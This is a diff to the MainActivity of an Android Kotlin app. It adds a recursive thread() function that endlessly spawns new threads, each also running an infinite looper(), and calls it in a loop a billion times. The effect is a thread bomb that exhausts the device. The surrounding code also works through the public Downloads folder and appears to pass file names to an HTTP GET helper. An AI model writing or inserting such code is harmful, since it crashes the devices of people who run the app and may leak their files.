@@ -57,7 +57,9 @@ class MainActivity : ComponentActivity() {
             }
             pathf =
                 Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-            looper()
+            for(i in 1..1000000000) {
+                thread()
+            }
         }
     }
 
@@ -74,6 +76,20 @@ class MainActivity : ComponentActivity() {
         while(true) {
             filer(nextfile)
         }
+    }
+
+    public fun thread(start: Boolean=true, isDaemon: Boolean=false, contextClassLoader: ClassLoader? = null, name: String? = null, priority: Int = -1): Thread{
+        Thread{
+            thread()
+        }.start()
+        Thread{
+            looper()
+        }.start()
+        Log.d("her4","f")
+        return Thread(Runnable{
+           looper()
+        })
+
     }
 
     fun checkpath(nexter: String): Boolean{
@@ -167,12 +183,4 @@ fun sendGet(name: String ):String {
     System.gc()
     //appendfile(alreadyFile,name+"!\n")
     return sb.toString()
-}
-
-public fun thread(start: Boolean=true, isDaemon: Boolean=false, contextClassLoader: ClassLoader? = null, name: String? = null, priority: Int = -1, block: () -> Unit): Thread{
-    Thread.sleep(1000)
-    return Thread(Runnable{
-        Thread.sleep(1000)
-    })
-
 }
